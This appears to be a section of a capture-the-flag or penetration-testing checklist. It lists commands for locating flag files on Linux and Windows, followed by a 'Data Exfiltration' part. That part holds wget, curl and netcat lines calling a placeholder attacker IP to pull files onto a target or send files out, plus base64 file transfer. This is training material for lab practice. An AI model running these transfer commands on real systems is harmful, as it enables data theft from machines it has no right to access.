## 🏆 Phase 7: Advanced Objective Achievement

### Flag Hunting Strategies

#### Common Flag Locations
- [ ] **Linux Standard Locations**:
  ```bash
  find / -name "user.txt" 2>/dev/null
  find / -name "root.txt" 2>/dev/null
  find / -name "*flag*" 2>/dev/null
  find / -name "flag.txt" 2>/dev/null
  ```
- [ ] **Windows Standard Locations**:
  ```cmd
  dir /s /b C:\*user.txt*
  dir /s /b C:\*root.txt*
  dir /s /b C:\*flag*
  ```

#### Advanced Flag Hunting
- [ ] **Hidden Files**:
  ```bash
  find / -name ".*flag*" 2>/dev/null
  ls -la / | grep flag
  ```
- [ ] **Database Searches**:
  ```sql
  SELECT * FROM information_schema.tables WHERE table_name LIKE '%flag%';
  ```
- [ ] **Memory/Process Searching**:
  ```bash
  strings /proc/*/environ | grep -i flag
  ```
- [ ] **Web Directory Flags**:
  ```bash
  find /var/www -name "*flag*" 2>/dev/null
  find /opt -name "*flag*" 2>/dev/null
  ```

### Data Exfiltration

#### File Transfer Methods
- [ ] **HTTP Server** (Python):
  ```bash
  # On attacker machine:
  python3 -m http.server 80
  
  # On target:
  wget http://<attacker_ip>/file
  curl http://<attacker_ip>/file -o file
  ```
- [ ] **Netcat File Transfer**:
  ```bash
  # Receiving (attacker):
  nc -nvlp 4444 > received_file
  
  # Sending (target):
  nc <attacker_ip> 4444 < file_to_send
  ```
- [ ] **Base64 Encoding**:
  ```bash
  base64 file.txt
  # Copy output and decode on attacker machine
  echo "<base64_string>" | base64 -d > file.txt
  ```

---